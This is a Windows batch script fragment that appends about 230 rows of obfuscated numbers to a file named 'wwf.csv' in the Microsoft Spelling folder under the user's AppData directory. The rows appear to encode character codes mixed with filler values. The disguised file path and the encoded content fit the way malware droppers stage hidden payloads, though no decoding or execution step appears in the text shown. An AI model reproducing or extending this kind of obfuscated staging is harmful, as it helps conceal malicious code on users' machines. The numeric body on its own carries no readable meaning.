>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.70;5835.30;67.30;95.50;72.0762;60.101;50.108;50.112;6729.50;95.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(79.50;117.6149;40.116;50.112;70.117;1244.70;116.40;153.612;0.0111;40.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(387.0;370.0;2568.667;0.695;0.672;0.8808;801.0;808.0;812.0;6653.695;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.779;0.817;0.3107;816.0;812.0;817.0;4439.816;0.349;0.894;12.9564;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.0;532.87;70.70;7441.70;67.50;95.40;72.4769;50.101;30.108;40.112;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8522.30;95.30;79.50;117.3542;70.116;40.112;30.117;7205.70;116.30;50.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(240.2128;512.0;70.36;587.0;1462.770;0.367;0.795;0.3104;772.0;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.0;0552.812;0.495;0.379;0.2606;817.0;816.0;812.0;0540.817;0.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.550;0.1334;695.0;549.0;811.13;0317.60;0.532;87.50;70.2446;70.67;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.95;50.72;7834.60;101.30;108.40;112.5060;40.95;60.79;30.117;4516.50;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.40;112.40;117.3312;40.116;60.53;40.215;9783.413;0.40;32.387;0.9199;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(570.0;367.0;695.0;5396.472;0.801;0.808;0.8959;812.0;395.0;579.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1322.817;0.816;0.812;0.3780;817.0;816.0;654.0;5636.322;14.40;0.634;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(87.3890;50.70;60.67;30.95;6338.40;72.60;101.70;108.3645;50.112;40.95;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.79;6378.60;117.30;116.60;112.2605;60.117;50.116;70.55;2226.60;97.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(90.414;0.8397;40.34;387.0;670.0;5471.467;0.695;0.672;0.9101;801.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.0;812.0;6458.595;0.779;0.817;0.3424;816.0;812.0;817.0;1103.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.555;0.498;0.8261;873.14;60.0;646.87;2257.60;70.30;67.30;95.5457;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(50.72;70.101;30.108;5187.70;112.30;95.60;82.7117;50.111;30.111;60.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6730.50;78.40;97.60;109.0344;30.101;50.115;70.112;2419.30;97.50;99.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.2049;30.49;30.226;614.0;5585.50;46.587;0.470;0.8218;367.0;395.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(572.0;3022.801;0.808;0.812;0.1663;795.0;482.0;811.0;3217.811;0.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.378;0.7141;697.0;809.0;801.0;3938.815;0.812;0.797;0.4995;799.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;550.0;5859.755;15.50;0.646;87.3464;30.70;50.67;60.95;3799.70;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(72.70;101.60;108.6620;40.112;30.95;40.82;2449.40;111.70;111.60;116.6726;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.78;60.97;70.109;6579.40;101.30;115.50;112.1436;60.97;30.99;30.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7608.40;51.30;129.315;0.7008;70.30;587.0;370.0;9720.367;0.595;0.472;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.8185;801.0;808.0;812.0;9433.495;0.585;0.815;0.4855;597.0;803.0;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.0;2857.451;0.881;15.50;0.8068;630.87;40.70;70.67;9117.50;95.30;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(72.70;101.2466;40.108;60.112;30.95;8857.30;85.60;115.60;97.1540;50.103;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(60.101;60.52;6848.50;4.416;0.70;30.4005;687.0;770.0;667.0;4562.495;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.572;0.801;0.9061;808.0;812.0;395.0;7772.685;0.815;0.697;0.8949;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(803.0;801.0;553.0;9488.381;16.50;0.350;87.7783;40.70;50.67;60.95;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0426.60;82.60;111.40;111.8643;40.116;40.78;30.97;2151.30;109.70;101.40;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(115.2123;70.112;40.97;30.99;1068.50;101.50;95.60;87.7078;40.97;70.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(40.110;7991.40;105.50;110.50;103.4135;50.135;316.0;70.18;9621.487;0.370;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0.667;0.0477;595.0;484.0;805.0;1635.816;0.808;0.801;0.6945;927.16;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(70.0;66.89;1324.50;101.70;115.70;24.6069;617.0;40.1;48.97;8277.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(115.801;109.798;108.4904;821.1;52.67;683.1;0623.710;99.804;101.599;107.3656;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.121;812.101;815.1;0587.42;99.816;1.755;67.3853;811.109;812.105;808.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9745.816;105.811;110.432;102.0391;805.110;805.115;804.101;3187.800;32.819;105.816;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(104.9056;432.123;648.125;532.119;3735.397;114.810;105.810;103.4819;440.115;641.44;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(732.123;0244.449;125.632;101.814;114.4313;811.114;540.115;641.46;1475.61;5.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.498;117.2950;803.1;51.100;41.9;0579.800;101.808;97.821;115.7549;805.103;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.1;771.101;1957.814;114.811;114.358;32.3106;673.110;818.97;808.105;6062.800;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.497;114.803;117.4547;809.101;810.116;558.32;6727.800;101.808;105.809;105.3803;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.101;814.32;640.39;6080.758;39.732;111.814;32.5953;739.61;539.41;632.109;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8509.697;121.532;110.811;116.3905;732.115;816.97;814.116;6113.532;97.632;115.819;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.3449;816.99;804.46;41.3;0061.801;120.801;1.51;45.9129;71.106;484.104;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.32;6966.815;101.814;118.805;99.1827;801.32;339.123;448.125;8677.739;32.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(117.815;116.1919;732.98;801.32;805.110;1712.815;116.597;108.808;101.3886;800.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(802.111;814.32;2866.816;104.805;115.332;111.9400;812.101;814.97;816.105;1835.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(110.332;116.811;32.0875;815.117;699.99;801.101;5558.800;46.632;32.769;110.8783;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.117;814.101;532.116;6302.804;97.816;32.816;104.3913;805.115;332.115;801.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6078.818;105.499;101.732;105.8876;815.32;797.118;697.105;8514.808;97.498;108.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(46.6746;41.49;384.104;801.32;6962.699;111.809;112.805;108.4048;801.114;432.103;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.110;0599.801;114.497;116.801;100.3619;432.116;804.101;332.102;5922.811;108.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.819;105.8276;810.103;532.109;801.115;5184.815;97.803;101.815;40.5269;815.41;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(658.1;54.104;1021.801;108.812;1.61;63.1597;61.63;801.114;814.111;8311.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(58.332;73.810;118.3683;497.108;805.100;532.118;2440.397;108.817;101.432;102.6476;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.114;732.47;499.104;9137.801;99.807;116.821;112.3995;801.115;558.32;809.117;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5025.815;116.632;115.812;101.2281;699.105;802.121;432.39;9657.343;39.744;32.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.4190;432.39;345.39;446.1;8744.763;101.814;114.811;114.5914;458.32;673.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(818.97;4692.808;105.800;32.800;101.2719;498.117;803.32;816.121;9974.812;101.432;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(102.811;114.5478;532.47;800.101;498.117;7581.803;58.532;109.817;115.4652;816.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.112;801.99;6010.805;102.821;32.539;43.6707;739.44;332.111;814.32;3717.339;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(45.439;46.41;62.8180;801.114;814.111;814.58;9820.332;73.810;118.597;108.6366;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.100;332.118;597.108;3287.817;101.332;102.811;114.0501;432.47;800.101;808.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0002.821;115.805;103.810;58.9197;432.109;817.115;816.32;7733.815;112.801;99.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(102.2157;821.32;539.43;639.44;8570.432;111.814;32.539;45.0255;539.46;71.71;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.114;5712.814;111.814;58.632;73.5573;810.118;697.108;805.100;9289.332;108.697;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(110.803;117.9598;697.103;801.32;816.121;2557.812;101.632;102.811;114.6250;432.47;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.97;810.103;5239.817;97.803;101.758;32.3544;809.117;815.116;532.115;6530.812;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.599;105.802;121.2229;332.39;499.115;639.44;4233.532;111.814;32.539;118.5802;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(798.39;546.1;359.101;7627.814;114.811;114.758;32.7206;673.110;818.97;808.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(7761.800;32.818;97.808;117.9116;801.32;802.111;814.32;9213.547;110.811;99.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(100.1459;801.58;532.109;817.115;2151.816;32.815;112.801;99.2069;805.102;821.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(739.43;9294.739;44.532;111.814;32.1593;339.45;439.46;41.73;1259.801;114.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.814;58.9686;632.73;810.118;797.108;0796.805;100.432;116.697;114.5252;803.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.32;816.121;5840.812;101.732;102.811;114.3771;632.47;816.97;814.103;1666.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.458;32.809;117.3735;815.116;632.115;812.101;4643.499;105.802;121.732;39.1719;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(397.115;815.101;809.98;7553.808;121.339;32.811;114.3886;332.39;801.120;801.39;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2454.446;1.512;107.801;121.3427;699.111;810.116;597.105;6661.810;101.814;1.77;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(107.4429;801.121;802.105;808.101;6392.41;8.808;97.810;103.8322;817.97;803.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(31.1;6480.808;1.57;108.805;98.5121;814.97;814.121;41.34;2355.801;114.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.814;58.8173;732.73;810.118;597.108;0669.805;100.632;108.805;98.0326;814.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.121;732.112;6358.797;116.804;32.339;123.9693;348.125;439.46;51.3;5908.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.398;1.651;101.7278;814.114;811.114;458.32;2025.777;105.815;115.805;110.2866;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(803.32;802.105;808.101;8271.732;115.812;101.799;105.0229;802.105;599.97;816.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0896.811;110.432;102.811;114.9754;732.39;347.123;648.125;7628.639;32.815;119.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.3154;599.104;51.1;745.1;0026.56;110.811;99.811;100.8375;801.1;32.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(399.1;5758.727;101.814;114.811;114.5355;658.32;578.111;532.105;2289.810;112.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.815;32.9639;815.112;801.99;805.102;0777.805;101.800;46.41;6.6926;810.111;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.111;803.111;9052.51;1.810;1.76;110.5138;811.119;597.114;810.1;8644.41;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(119.71;3.811;117.1502;816.1;51.111;41.56;6605.801;114.814;111.814;58.9199;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(632.84;804.101;532.114;1228.801;102.801;114.801;110.8110;799.101;800.32;397.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1985.815;101.809;98.808;121.9746;732.39;823.48;825.39;0354.432;99.811;117.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(100.8320;332.110;811.116;732.98;7336.801;32.802;111.817;110.8274;800.46;31.9;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.101;5212.802;101.814;101.810;99.4947;801.1;51.114;31.8;4961.814;101.815;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.817;114.9980;399.101;41.3;814.101;8934.815;1.313;114.811;111.4606;816.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(797.109;801.115;6765.812;97.699;101.51;3.4934;814.110;815.1;316.32;1096.447;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.811;111.816;110.2249;697.109;801.115;812.97;2176.799;101.458;1.548;101.5053;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.114;811.114;358.32;8003.384;104.801;32.815;111.4187;817.114;399.101;632.102;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6525.805;108.801;32.439;123.2658;448.125;539.32;599.111;5360.817;108.800;32.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.8719;816.32;698.101;732.102;2428.811;117.810;100.546;1.4681;753.101;814.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.114;9443.558;32.373;110.818;97.9316;808.105;800.32;697.114;6673.803;117.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.810;116.2226;532.39;823.48;825.39;3294.358;32.816;104.801;32.4782;815.119;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.116;399.104;5303.632;105.815;32.809;105.0488;815.115;805.110;803.46;6605.41;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(6.816;97.814;103.0296;801.116;41.1;816.1;8527.31;43.61;47.801;114.1946;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.111;814.58;532.85;4046.810;114.801;99.811;103.1452;810.105;822.101;800.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3723.499;111.809;109.497;110.8052;800.45;808.105;810.101;8494.732;111.812;116.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(111.3147;810.58;332.39;823.48;0886.825;39.546;1.454;101.4174;814.114;811.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(458.32;8977.584;104.801;32.816;121.2135;812.101;332.111;802.32;9530.815;111.817;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.699;101.2544;332.102;805.108;801.32;6679.439;123.348;125.339;32.3790;805.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(532.110;811.116;3407.632;115.817;112.812;111.6091;814.116;801.100;746.1;2518.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(86.466;1.657;67.6461;811.112;821.114;805.103;8804.804;116.632;40.767;41.4705;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(632.77;805.99;814.111;7347.815;111.802;116.732;67.1293;811.114;812.111;814.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8704.816;105.811;110.546;32.6863;565.108;808.32;814.105;2217.803;104.816;115.732;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.3520;801.115;801.114;818.101;4682.800;46.61;77.447;99.1394;804.101;699.107;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.121;5719.812;101.815;91.643;124.2075;545.93;332.32;532.32;6306.532;32.632;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.532;32.8603;432.32;467.104;801.99;2576.807;32.802;111.814;32.4930;812.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.109;805.116;1808.816;101.800;32.816;121.4552;812.101;815.32;805.110;7489.332;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(119.802;99.446;101.9572;820.101;646.99;811.110;3787.802;105.803;32.802;105.8785;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.101;546.1;469.32;4785.432;32.332;32.332;32.0601;532.32;432.32;432.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(8561.432;32.732;32.332;32.7724;732.32;732.32;432.32;0329.732;32.532;84.804;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.8921;632.100;801.102;797.117;3422.808;116.432;105.815;32.4447;339.45;639.46;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(732.83;3537.804;111.814;116.432;102.5720;811.114;809.32;805.115;1550.432;39.447;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(99.816;58.1762;639.46;51.43;332.32;9705.532;32.432;32.732;32.0098;532.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(632.32;632.32;6035.432;32.732;32.732;32.1432;732.32;632.32;645.32;4910.367;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(79.768;69.532;71.7463;369.78;669.82;565.84;4398.773;79.378;32.445;1.3366;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(680.47;800.101;498.117;7952.803;91.443;124.445;93.3341;632.32;732.32;332.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1687.632;32.732;32.532;32.5396;332.32;732.32;432.69;2584.809;105.816;32.802;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(117.8520;808.108;432.100;801.98;8091.817;103.803;105.810;103.6765;732.105;810.102;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(811.114;1346.809;97.816;105.811;110.3830;346.32;484.104;801.32;3851.800;101.802;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(97.817;108.1495;816.32;805.115;532.39;7974.443;39.546;1.339;32.6711;532.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(432.32;532.32;9042.732;32.632;32.732;32.3478;732.32;632.32;632.32;7405.532;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.532;32.332;45.3506;532.73;478.80;685.84;5688.632;70.673;76.769;83.4893;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(432.45;61.53;460.88;0480.811;109.808;32.802;105.2915;808.101;732.108;805.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(9889.816;62.732;32.632;32.3967;432.32;432.32;732.32;7664.432;32.788;111.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(108.3640;732.115;811.117;814.99;4372.801;32.802;105.808;101.8182;432.110;697.109;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.40;7881.815;41.646;1.369;84.0793;804.101;632.114;801.115;8260.811;117.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(99.801;32.8371;810.97;809.101;732.105;1909.815;32.699;111.810;115.6314;816.114;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(817.99;816.101;3078.800;32.798;121.432;117.9707;815.105;810.103;632.116;3825.804;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.332;110.597;109.6539;801.115;812.97;499.101;6188.532;97.810;100.632;116.2680;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(821.112;801.32;810.97;0066.809;101.41;73.811;102.8039;332.116;804.101;432.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1328.799;116.805;118.805;116.4808;821.46;632.70;811.114;9419.632;101.820;97.809;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.9676;808.101;344.32;597.110;4894.732;97.699;116.805;118.2500;805.116;821.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.97;6034.809;101.800;32.334;77.3715;821.65;699.116;805.118;4982.805;116.821;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(34.532;105.9013;810.32;810.97;809.101;3155.815;112.597;99.801;1.5679;769.34;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(687.70;380.114;6614.811;106.801;99.816;34.5244;632.119;811.117;808.100;1129.632;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(114.801;113.817;105.6759;814.101;632.114;801.115;9070.811;117.814;99.801;32.0105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.97;809.101;815.32;8325.534;87.770;80.814;111.2389;806.101;599.116;746.77;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(5151.821;65.499;116.805;118.7106;805.116;821.46;814.117;5223.808;101.815;34.71;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(37.0395;497.110;800.47;811.114;2286.732;34.687;70.480;114.8114;811.106;801.99;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(816.46;2267.577;121.365;99.816;105.6689;818.105;816.121;346.108;5095.397;121.811;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(117.816;34.3625;746.1;353.60;818.98;5732.347;99.815;32.802;105.6988;808.101;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(732.108;805.115;7721.816;62.532;32.532;32.1122;332.32;432.32;432.32;3402.432;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(67.811;100.801;45.9862;798.101;815.105;800.101;0225.432;102.805;108.801;32.7612;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(810.97;809.101;640.115;0695.641;46.61;83.747;114.0957;801.102;801.114;801.110;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(2498.599;101.558;60.802;105.2999;808.101;432.108;805.115;8329.816;62.732;32.432;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.8680;332.32;382.101;802.101;9945.814;101.810;99.801;32.0971;809.101;816.97;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(800.97;2711.816;97.432;102.814;111.5319;809.32;816.104;801.32;8285.815;112.801;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(99.805;102.0571;805.101;800.32;497.115;2838.815;101.809;98.808;121.2541;532.102;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(805.108;801.40;0994.815;41.746;1.648;32.1602;732.32;532.32;532.32;5856.532;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.432;32.332;32.1875;632.32;432.32;432.32;1218.732;32.732;32.332;32.3894;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(432.32;432.83;804.111;8415.814;116.732;102.811;114.2592;809.32;805.115;632.39;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1418.647;114.358;39.746;1.3451;682.47;808.105;698.114;1942.697;114.821;58.560;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(112.0109;497.116;804.32;808.105;5017.815;116.362;32.332;32.4727;432.32;332.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(332.83;2702.801;116.532;111.802;32.7820;800.105;814.101;499.116;2017.811;114.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(101.815;32.9777;819.104;801.114;801.32;0428.816;111.432;108.811;111.5807;807.117;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(812.32;802.111;3443.814;32.816;104.801;32.7356;814.101;802.101;814.101;9720.810;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(99.801;115.546;1.2461;350.32;632.32;532.32;8955.332;32.732;32.532;32.7313;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(432.32;732.32;432.32;6879.332;32.732;32.632;32.9200;532.32;632.32;732.83;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0864.804;111.814;116.532;102.8399;811.114;809.32;805.115;8796.632;39.747;108.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(98.6955;558.39;346.1;380.47;3956.814;101.815;111.817;114.2162;799.101;358.60;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(814.101;7277.815;105.810;102.811;62.4484;332.32;632.32;532.32;3040.732;32.332;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(69.809;98.3616;801.100;432.116;804.101;2359.332;115.812;101.499;105.0394;802.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(801.100;732.114;8832.801;115.811;117.814;99.2794;801.46;332.83;804.111;9400.814;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(116.732;102.811;114.2927;809.32;805.115;632.39;7385.747;114.801;115.458;39.9259;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(646.1;679.32;732.32;2747.332;32.632;32.732;32.7944;632.32;432.32;632.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(0067.532;32.732;32.332;32.8349;332.32;732.32;532.32;0623.732;114.801;115.805;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(110.0828;802.111;532.102;811.114;4167.809;97.816;32.805;115.1665;632.60;802.105;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.101;8222.562;91.544;60.810;97.4999;809.101;362.91;344.112;7795.817;98.808;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(105.699;124.9624;812.114;805.118;797.116;9700.801;93.493;46.41;71.5148;382.117;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(808.101;815.32;1447.597;110.800;32.802;114.1495;801.101;802.111;814.109;3844.332;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(108.597;121.811;117.9153;816.32;802.105;808.101;7416.815;32.809;117.815;116.7416;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(732.98;801.32;801.109;8445.598;101.800;100.801;100.8503;632.97;815.32;597.115;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(3253.815;101.809;98.808;121.8632;432.114;801.115;811.117;4217.814;99.801;115.546;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(1.0808;636.32;732.32;532.32;0087.532;32.532;32.432;32.3266;332.32;732.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(532.32;2072.432;32.632;32.632;32.3971;332.45;332.76;365.78;9727.471;85.565;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(71.369;32.5080;545.1;772.47;808.97;4925.810;103.817;97.803;101.1907;458.91;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(799.115;824.118;1054.398;93.332;32.432;32.1669;332.32;332.32;632.32;2826.732;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(84.804;101.732;108.1978;697.110;803.117;697.103;2667.801;32.816;111.332;117.9497;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(815.101;532.102;811.114;0282.732;116.804;101.732;103.4615;801.110;801.114;397.116;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(4440.801;100.732;99.808;97.1767;815.115;346.1;674.32;8895.332;32.632;32.632;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(32.8711;432.32;632.32;432.32;5854.632;32.432;32.532;32.3939;532.32;632.32;
>> "%APPDATA%\Microsoft\Spelling\wwf.csv" echo(532.32;4753.732;32.332;84.804;101.2258;432.100;801.102;497.117;8345.808;116.532;
